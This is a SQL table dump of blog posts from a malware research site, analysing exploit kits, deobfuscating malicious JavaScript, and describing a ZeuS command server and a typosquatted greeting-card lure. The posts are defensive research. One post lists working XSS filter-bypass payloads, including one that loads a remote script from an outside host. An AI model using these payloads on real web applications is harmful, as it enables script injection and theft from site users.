redirects', 'http://www.kahusecurity.com/?p=116\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (170, 'Siberia Exploit Kit', 'darryl', 'January 14, 2011', 'Siberia Exploit Kit has been around for awhile but has been updated recently and the Javascript used to send users to its exploit page has changed. Here we see the original mess that conceals a redirect.\n\nAfter I remove all the bogus comments and beautify the code, this is the result:\n\nIt’s better but we have that blob of junk with all the letter “F”s in the middle. The top part of Javascript basically gets rid of the “F”s and returns the result to the calling function. This is how it looks like after the cleanup:\n\nWe see that it is a Javascript code that sends the user to a webpage that will deliver a PDF exploit. That was simple…but there’s still some Javascript code at the bottom we haven’t accounted for. The second chunk of code after the original blob of junk executes the PDF function in an unusual way.\n\nThe code returns the deobfuscated PDF redirect script in lala0 then it creates a for-next loop. On its first iteration, a new function is created and returns the result of lala0 into lala1. It keeps doing this over and over. Here’s how it looks like:\n\nAt the end of the loop cycle, the last line of the script evals lala45() which executes the deobfuscated PDF redirect script and sends the user to page with the Acrobat exploit. In fact, calling any one of these functions will eventually execute the redirect that was defined by the first lala0 function.', 'malicious, siberia', 'http://www.kahusecurity.com/?p=107\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (171, 'Java Exploit Construction Kit', 'darryl', 'January 10, 2011', 'Websense put out a blog post late last year that shocked me and probably the rest of the security world about how many Java exploit attempts there were compared to PDF exploits. Based on reports I’ve read throughout the year, I had thought that PDF exploits were on the top of the charts. Boy was I wrong.\n\nTurns out that hackers have created a kind of Java exploit construction kit to help make the generation process much easier and quicker to do. It’s now in the hands of script kiddies. No wonder there’s so many Java exploit attempts!\n\nAll you need to do is run the program, make your selections, and generate a folder with all the files you need to start exploiting computers. But it’s not a true drive-by download as it relies on social engineering.\nWhen you launch the webpage, you are greeted by the following graphic:\n\nAnd a second later, you get a Java digital signature warning. While it looks pretty authentic, it’s self-signed but it’s good enough to fool most people.\n\nWith Adobe’s release of Acrobat X, it’s now Oracle’s turn to get their act together.', 'exploit, java, social engineering', 'http://www.kahusecurity.com/?p=101\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (172, 'New Exploit Kits', 'darryl', 'January 2, 2011', 'PandaLabs reported that 34% of all malware ever created has appeared in the last ten months of 2010. Between all the malware development, packing and repacking, hackers were somehow able to make new exploit kits.\nHere’s the first one which I have very little information on. It may possibly be called “Impact Exploit Kit”. The exploit code is very similar to the code used by SEO Sploit Pack so it is either an upgrade or a spinoff. I’m trying to get my hands on this pack.\n\nHere’s the second one, which is unnamed. Below is a screenshot of the statistics page which shows over 2,850 loads (7.15% efficiency).\n\nThis screenshot shows the statistics by operating system.\n\nThis kit uses nine exploits (4 PDF, 2 IE, 1 Help, 2 Java) with the Java ROX exploit showing the highest efficiency rating. The exploits selected for this kit look to be the most effective ones from the Phoenix Exploit Kit (PEK) which is probably the best exploit kit out there today.\n\nThis kit frequently resides on co.cc domains and appears to be quite popular at the moment.\nHere’s the obfuscated exploit code it uses:\n\nThere are three sections in the source code. The first part is up at the very top…the ‘host’ variable is assigned a URL which is barraged with a garbage character ($). The second part is a malicious JAR file that gets called. The third part is the remainder of the screen. There’s a bunch of misdirection (bogus variable assignments and comments) then a bunch of Q’s. In between the Q’s is the exploit code so all you need to do is search for the letter “Q” and replace it with “”.\n\nThere’s a third exploit kit that I found which I cover in another post.', 'deobfuscation, exploit kit, impact exploit, malicious javascript, seo sploit', 'http://www.kahusecurity.com/?p=94\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (173, 'SpiderMonkey 1.8.5 for Windows', 'V', 'December 8, 2010', 'Get a Windows binary build of Mozilla’s JavaScript 1.8.5 engine here: spidermonkey-1.8.5.zip\nThe source code was downloaded from Mozilla’s Mercurial repository via http://hg.mozilla.org/mozilla-central/ on 2010-11-24. This is based off of the latest successful build “mozilla-central” after Mozilla Firefox 4.0b7 was released.\nThis version of SpiderMonkey was built on 2010-11-26 with Microsoft Visual Studio C++ 2008 Express Edition with the Microsoft Platform SDK for Windows Server 2003 R2. It has been tested to run on Windows XP Service Pack 2.', '1.8.5, engine, Firefox, javascript, JägerMonkey, Mozilla, SpiderMonkey, windows', 'http://www.kahusecurity.com/?p=80\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (174, 'Deobfuscating Tricks', 'darryl', 'December 7, 2010', 'Deobfuscating malicious Javascript can be tricky at times. Luckily, there are several techniques researchers can use to decode Javascript that has been purposefully obscured to hide its real intentions.\nHere are the common techniques I use to deobfuscate malicious scripts (many thanks to their respective researchers!):\n1. Assign eval to a variable\nFrom: eval(code…);\nTo: var x = eval(code…); document.write(x);\n2. Replace document.write() with alert()\nFrom: document.write(code…);\nTo: alert(code…);\n3. Replace eval() with document.write()\nFrom: eval(code…);\nTo: document.write(code…);\n4. Wrap code with alert()\nFrom: (window[‘code…\nTo: alert((window[‘code…\n5. Surround output with textarea\nFrom: <script>code…</script>\nTo: <script>document.write(“<textarea cols=50 rows=50>”);code…<document.write(“</textarea>”)</script>\nHackers are hard at work to come up with new ways to defeat anti-virus, spam/web filters, IDS, and even security researchers. As a result, the above tricks sometimes fail to deobfuscate malicious scripts.\nHere’s one example:\n\nThis script looks for the DIV container which is up at the top and attaches HTML code to it. Here’s the offending code:\ndocument.getElementById(\\\"pdfplace\\\").innerHTML = \\\"<object width=\\\'0\\\' height=\\\'0\\\' frameborder=\\\'0\\\' type=\\\'application/pdf\\\' data=\\\'exp/pdf.php?user=admin&pdf_acces=on\\\'><param name=\\\'src\\\' value=\\\'1.pdf\\\'>\\\";\nTo get around this, here’s what you can do. Replace this tag:\n<div id=\"pdfplace\"></div>\nWith this:\n\n<textarea id=\"pdfplace\" cols=50 rows=10></textarea>\nAnd here is the result:\n\nSince the malicious script is using getElementById to find “pdfplace”, I add the same ID to the textarea tag to capture the results in the textbox.\nHere’s another trick. First, let’s take a look at this example:\n\nIf you look carefully around the fifth line from the bottom on the far left, you should see the text, “i.body.appendChild(B);”. This malicious script is attaching a redirection script to the body of the webpage.\nSo what you can do is right after the above text, simply add the following code:\ndocument.write(window.document.body.firstChild.nodeName+\' \'+window.document.body.firstChild.getAttribute(\'src\'));\nHere’s what the script will look like after you insert the code:\n\nAnd here’s the result:\n\nWhat this code does is writeout the name of the node which could be the tag name or attribute name (it could say “script”, “iframe”, etc). The second part is the source (src) attribute which is often used in malicious redirections. You can use other attributes based on the malicious Javascript or just walk the DOM tree’s objects.\nHere’s a variation of the code which allows you to select a specific element from a collection of child nodes; just replace 0 with 1 or whatever:\ndocument.write(document.body.childNodes[0].nodeName+\' \'+document.body.childNodes[0].getAttribute(\'src\'));\nI’m sure that hackers will come up with other ways to obfuscate their scripts that will bust these two techniques so it’s always good to learn how to reverse scripts manually. But until then, I hope these additional tricks will help you analyze malicious scripts as it has helped me!', 'deobfuscation, javascript, malicious, reverse', 'http://www.kahusecurity.com/?p=74\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (175, 'Malicious Javascript Analysis II', 'darryl', 'December 4, 2010', 'This obfuscated Javascript came from a new, unknown exploit kit. There’s a large chunk of code that looks pretty scary!\n\nWe can see a couple of things from this partial look at the script. It appears to be using AJAX which isn’t very common in malicious scripts that I’ve run across. I cleaned up the code and came up with this.\n\nThere are two functions in this script. The function at the top isn’t called until the second function in the middle is called first. The ‘kjejz’ function gets AJAX ready then gets rid of the text string of “gsoqtecw” from the variable ‘pxomwgzp’. I guess it wasn’t too scary after all! We’re left with decimal values (I inserted the backslash delimiter to convert this manually myself).\n\nThe code then converts the decimal to text and we get this.\n\nWe get the final Javascript code and see that it writes out some div containers and an object tag with a PDF classid of “CA8A9780-280D-11CF-A24D-444553540000”. Then it inserts an iframe to exploit Acrobat regardless of the installed version. Simple and straightforward.', 'exploit kit, javascript, malicious', 'http://www.kahusecurity.com/?p=67\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (176, 'Malvertisement Leads to Dragon Pack', 'darryl', 'December 2, 2010', 'Dragon Pack is a new exploit kit that has hit the hacker scene. It sports only a handful of exploits but they are arguably the most successful ones. If nothing else, this pack looks very cool.\n\nAnyway, let’s take a step back to the website that kicks off the browser exploitation. If you click on some of the links of the various companies on the website seen below, you’ll be saying hello to Dragon Pack. I don’t want to call out specific pages since there may be some confusion about whether those companies are spewing malware. Of course, they’re not. One of the ad campaigns is infected and Manta is inserting this ad in some of the listings.\n\nHere’s a graphic that shows the URL (in bold) and the specific link in the page’s HTML source code which leads to the next link in the chain until the final malicious site with Dragon Pack is called.\n\nThere were two interesting sites that I took a closer look at. The first was the perconel.com site. You can see the obfuscated Javascript that opens an iframe to the Dragon Pack site.\n\nOn the Dragon Pack site itself, you can see one of its exploits. Believe it or not, the obfuscated Javascript is actually similar to the one above. There’s a lot of concatenation going on above but the de-obfuscation routine is the same as this one.\n\nLet’s walk through de-obfuscating this script. Here is a sample I pulled off from another site earlier but it’s also similar. By the way, the first two lines of the Javascript code were in separate external JS files which I included here for the sake of brevity.\n\nThis script is straightforward to figure out. The 3rd and 4th lines assign “eval” to the dLnOQO variable.\nvar NDotmhh0=[‘n’,’e’,’G’,’j’,’y’,’v’,’E’,’l’,’p’,’K’,’u’,’a’,’z’,’O’,’l’,’l’];\nvar dLnOQO=NDotmhh0[1]+NDotmhh0[5]+NDotmhh0[11]+NDotmhh0[14];\nThe other variable assignments sets up “this” and “unescape” so that the last line at the bottom executes the final output. Here’s the decoded version of that line:\nthis.eval(this.unescape(ret));\nThe final output comes from the obfuscated text assigned to the strochka variable. The algorithm 4/5th of the way down does a look up of each character. If it finds it in desttable up at the very top, then it gets the corresponding character from srctable based on its position. So the first character of “L” of the obfuscated text corresponds to the character “%”, “2” corresponds to “6”, “p” corresponds to “4”, etc.\nYou’ll eventually get a string of hex which is unescaped and eval’d (de-obfuscated code).\n\nThis script tries to exploit Java two different ways as well as Acrobat.\nIf we were to bypass the analysis and just insert a <textarea> tag to the beginning of the script to see the final output, we’ll end up with only part of the final code, the Java exploit. Where’s the Acrobat exploit?\n\nIf we replace the eval line at the bottom with document.write(unescape(ret)). Now you can see both the Java and Acrobat exploits.\n\nBut it’s still not complete. The best way to deal with this script is to replace the eval line with document.write(ret). We’ll end up with hex code.\n\nIf we convert this to text then we get all the code which is what you see at the “de-obfuscated code” graphic above.\nThe lesson here is that if you just use shortcuts without understanding the script, you may come up short and walk away with only half the story.', 'javascript, malicious', 'http://www.kahusecurity.com/?p=61\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (177, 'Bypassing XSS Filters', 'darryl', 'November 29, 2010', 'Testing web applications can be a frustrating experience especially when you keep seeing the same developer mistakes over and over again. In one of the web apps I recently tested, the developer was not sanitizing user input the right way. Why they didn’t escape harmful characters I do not know. Instead, it looked like they were fixated on filtering just the opening HTML tags. For example…\n<script> was filtered but </script> was not.\n<iframe> was filtered but </iframe> was not.\nI tried different methods to get <script> past their filter but nothing seemed to worked. I was pretty sure there was a XSS vulnerability but I just could not get my opening HTML tag to get through. So then I thought that since the closing HTML tags work, why not use that instead. I came up with these two filter bypasses:\n\"></a style=\"background:url(javascript:alert(\'xss\'))\">\n\"></ style=\"background:url(javascript:alert(\'xss\'))\">\nI then went back and tried a couple of other harmless HTML tags to better understand what it was filtering:\n<i> and </i> were allowed but <i > was filtered.\n<br> and </br> were allowed but <br > was filtered.\nI noticed that if a letter followed the < sign and a space appeared within a tag, then it was filtered. Hmmm, why don’t I just eliminate the space then? I came up with these additional bypasses:\n\"><i/style=\"background:url(javascript:alert(\'xss\'))\">\n\"><br/style=\"background:url(javascript:alert(\'xss\'))\">\nIn another part of the same application, the user could email an article to a friend. The form included a text box that the user could enter a comment but Javascript, HTML code, and URLs were all filtered.\nIt looked like the same filter as the one above was used so opening HTML tags were blocked but closing ones were not. It did not like any spaces within the tags nor the word “script”. To detect HTML code, it looked for the presence of the > sign. URLs were detected through the use of “http”.\nHere’s what I came up with that bypassed their filters:\n</a/style=color:expression(alert(\'xss\'));%0d>\n</a/style=color:expression(location.href=\'ht\'+\'tp://google.com\');%0d>\n<a/href=\"file://c:\\windows\\system32\\calc.exe\";%0d>Link</a;%0d>\nOne of the challenges I faced was how to reference an external Javascript file. While the following link works, I wanted to see if there were other methods.\n\"><i/style=\"background:url(javascript:document.write(\\\"<scr\\\"+\\\"ipt src=\'http://site.com/1.js\'></script>\\\"))\">\nSearching the web yielded no other alternatives. There must be another way! After playing with this for awhile, I found that this works quite nicely.\n\"><i/style=\"background:url(javascript:a=\\\"<scr\\\"+\\\"ipt%20src=http://site.com/1.js></script>\\\")\">\nI’m going to keep trying because I’m sure there are other ways to do this.', 'javascript, xss', 'http://www.kahusecurity.com/?p=50\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (178, 'Malicious Javascript Analysis', 'darryl', 'November 26, 2010', 'Hackers rely on Javascript like a carpenter relies on his hammer. Javascript is used in exploits, XSS, drive-by downloads, etc. It is also used to redirect users to a malicious website. The following malicious Javascript came in with email as an HTML attachment. It is a very clever piece of code (I beautified the code so it’s easier to read).\n\nThe top portion holds the algorithm that converts obfuscated text into the final code that will redirect the user to a malicious website. The last line of code just above the closing script tag is the obfuscated redirect code. I’ll walk through the de-obfuscation process then show you a quick way to obtain the final code.\nHere is the obfuscated text that holds the redirect code:\netgr(\"0i\\\"vda0>s-0me-h;c=ox>ft:.h-00n.s-v:d;=x e\\\"moc>;a<msatmsol<.ituqchiix-e<u0:alpaxr\");\nThe first part of the code sets up a loop. The loop starts off at 0 and goes to the first position of the obfuscated text and gets the character which is “0”. It then looks through the secret decoder ring, if you will, which is the string at the very top to find a match.\niyv2=\"0ocdfum;ip/qrlx=nt.-:v he&rt;s\\\"a<\"\nIt finds the “0” character in the 1st position which is actually position 0. Then we get to this next piece of code, the main decoding algorithm:\nkpn8-=(p3je+1)%j446;\nif (kpn8<0) {\nkpn8+=j446;\n}\nraiy(iyv2.charAt(kpn8));\nkpn8 is the value of the location of “0” which is 0.\np3je is the value of the loop which is also 0.\nj446 is the length of the secret decoder ring which is 30.\nSo 0 + 1 modulo 30 equals 1.\nkpn8 is then deducted by 1 which leaves us with the value of -1.\nSince -1 is less than 0 then kpn8 + j446 (-1 + 30) is 29.\nThe last part of the above code then looks up the character at the 29th position of the secret decoder ring which is “<meta http-equiv=”refresh” content=”0;url=hxxp://numerouno-india.com/x.html” />\nIn some cases, you can coax the script into giving you the de-obfuscated code without having to manually figure it out. Here’s how you can do it with this script (thank you SANS):\nJust after the open script tag, insert the following:\ndocument.write(\"<textarea cols=50 rows=5>\");\nAnd just above the closing script tag, you can optionally insert this:\ndocument.write(\"</textarea>\");\nHere’s a shot of how it looks:\n\nAnd when we run the script in our browser, we get the final code in the textarea box:\n\nI’ve been working on a program that will help to reveal what these redirects are. It doesn’t de-obfuscate it in any way. Instead, it just runs the Javascript code and when the script tries to open a connection with a malicious website, my program grabs the HTTP request and tears the request down. There is no connection made to the malicious website so your computer is safe from the site.\nAnyway, here’s what it looks like in action:\n\nI’ll eventually release this tool but in the meantime, happy decoding!', 'javascript, malicious', 'http://www.kahusecurity.com/?p=41\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (179, 'New Russian Exploit Kit', 'darryl', 'November 24, 2010', 'On the eve of Thanksgiving Day, I followed the trail of a drive-by exploit which led me to a new, yet-to-be-named exploit kit. It’s in Russian but I think you can make a few things out. This site is located on a co.cc domain and has just five exploits (three Java, Windows Help, and MDAC). \n\nThe number of successful loads looks to be 412 computers (11% efficiency). The following screenshot shows the malicious files setup to be downloaded.\n\nI couldn’t find the name of this kit in the HTML source code. If anyone knows, drop me a note.\nUPDATE\nJorge Mieres of Malware Intelligence Blog fame was kind enough to tell me that this exploit pack is BOMBA. Thanks Jorge!', 'java, russian', 'http://www.kahusecurity.com/?p=37\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (180, 'Bleeding Life Exploit Pack', 'darryl', 'November 23, 2010', 'I came across a new exploit pack called “Bleeding Life”. This one has six exploits at its disposal and costs $200 in the underground. As you can see, it only focuses on Acrobat, Flash, and Java vulnerabilities which has a very high success rate. \nAdobe Reader CVE-2010-1297 Affected Versions 9.0 – 9.3.2\nAdobe Reader CVE-2010-0188 Affected Versions 9.0 – 9.3.0\nAdobe Reader CVE-2010-0188 Affected Versions 8.0 – 8.2.0\nAdobe Reader CVE 2008-2992 Affected Versions 7.0 – 7.1.0\nAdobe Flash CVE-2009-1862 Affected Versions 10.0 – 10.0.22\nOracle/Sun Java CVE-2010-0842 Affected Versions x.x up to 1.0.6.18\nThe pack was downloadable from the Internet:\n\nBut all the files were encrypted so I was not able to view the source code. I did find a live version of this pack and it appears to be getting a 13.5% exploitation rate.\n\nYou’ll also notice that Windows XP is still very popular and these exploit packs do in fact affect Windows 7 machines.\n***** UPDATE *****\nLooks like BleedingLife Exploit Pack version 2.0 has been released.\n\nIt now has the following exploits and costs $400 for new buyers:\n– CVE-2010-0806 – IEPeers Uninitialized Memory Corruption Vulnerability – IE6/IE7 Only – ALL Windows\n– CVE-2010-0842 – Java Unspecified vulnerability in the Sound component – Java 6 < Update 19 - ALL Windows\n- CVE-2010-3552 - Unspecified vulnerability in the New Java Plug-in - Java 6 < Update 22 - IE Only - ALL Windows\n- CVE-2008-2992 - Adobe Reader util.printf Stack Overflow - Adobe Reader < 7.1.1 - ALL Windows\n- CVE-2010-1297 - Adobe authplay.dll ActionScript AVM2 \"newfunction\" Vulnerability - Adobe Reader < 9.3.3 - ALL Windows\n- CVE-2010-2884 - Adobe authplay.dll ActionScript AVM2 memory corruption Vulnerability - Adobe Reader < 9.4.0 - ALL Windows\n- CVE-2010-0188 - Adobe Libtiff Integer Overflow - Adobe Reader < 9.3.1 - ALL Windows\n- CVE-2010-0188 - Adobe Libtiff Integer Overflow - Adobe Reader < 8.2.1 - ALL Windows\n- JavaSignedApplet - Java Signed Applet to download/exec payload (Requires user interaction but can be disabled.) - ALL Windows', 'java, pdf', 'http://www.kahusecurity.com/?p=36\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (181, 'ZeuS…Alive and Well', 'darryl', 'November 21, 2010', 'Despite reports that the ZeuS author is getting out of the scene, hackers will probably use the ZeuS kit for awhile. Without support, ZeuS won’t be getting new features like Zitmo to keep up with banking defenses but ZeuS can still be crypted and packed to continue to evade anti-virus and get onto user’s PCs. Eventually, we will start seeing more use of SpyEye (will it be ZeuSpy or SpyZeuS) and other banking Trojans to fill the void.\nToday I researched a ZeuS infection. The PC made a connection to the C&C server. If you’ve ever played with this kit, you’ll know where the control panel is located.\n\nI won’t brute-force the login so this screen may be all I’ll ever see of the control panel. However, there’s a couple of other places we can check out that are fairly common to ZeuS kits, if you know where to look.\n\nBecause of how the webserver and kit was setup, we are lucky to see the logs that hold the victim’s logins and cookies. I counted over 300 victims that appear to have been compromised in just the past three days.\nHere are two of those victim’s log files. You’ll see info about their computer and the login credentials to their banking sites.\n\n\nThe first fellow had a very weak password while the second fellow had a very strong password. In the end, the account with the strong password was just as vulnerable as the one with the weak password.', 'cybercrime, spyeye, zeus', 'http://www.kahusecurity.com/?p=24\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (182, 'Saved By A Single Character', 'darryl', 'November 17, 2010', 'You can tell it’s nearing the holidays as many of us start trading virtual greeting cards. One of my colleagues’ boss received an email inviting him to retrieve a virtual greeting card from his friend Mary. The links showed that it belonged to Hallmark Greetings so he was very close to clicking on the link (www.halmark-greetings.com). However, at the last moment he noticed that it was missing an “L” so he paused and then asked for a second opinion.\n\nThat missing “L” saved his computer from a likely malware infection.\nI went ahead and examined the website and grabbed the source code. It was heavily obfuscated. \n\nHere’s how the page looked like if you did visit the page. Besides the Java applet, there were three textareas with code in them and a 4-digit number which turned out to be very important.\n\nHere’s the entire script that I cleaned up a bit:\n\nThe gibberish at the bottom is the obfuscated code. There were about 11,000 characters there so we can safely assume that it is exploit code. The top portion de-obfuscates this gibberish. The key to the de-obfuscation is the 4-digit number between the paragraph tags at the top. Essentially, the script grabbed every 1,113rd character as it looped through all the characters of the gibberish to form the final code.\nYou can insert the following into the script and grab the output after the de-obfuscation routine. Be sure you comment out the next part as it will execute the code (the “0x65,118,0×61,108” spells EVAL).\n\nvar kzklc=doclyqe5(kukqcu);\ndocument.write(kzklc); //insert here\n//this[String.fromCharCode(0x65,118,0x61,108)](kzklc);\n\nHere are the results of our de-obfuscation:\n\nBy reviewing the code, it is definitely exploit code. Actually it’s several exploits including one for QuickTime, Flash 9.0.x, and Flash 10.0.x. It also calls the IEPeers and MDAC exploit code should the victim’s PC not have these software installed. Depending on your browser, you will get another batch of exploits.\n\nThis code exploited Java and Acrobat versions 8.0.0 to 9.3.0 and versions 9.3.1 to 9.3.4.\nHappy Holidays!', 'exploit, javascript, malicious', 'http://www.kahusecurity.com/?p=10\n');
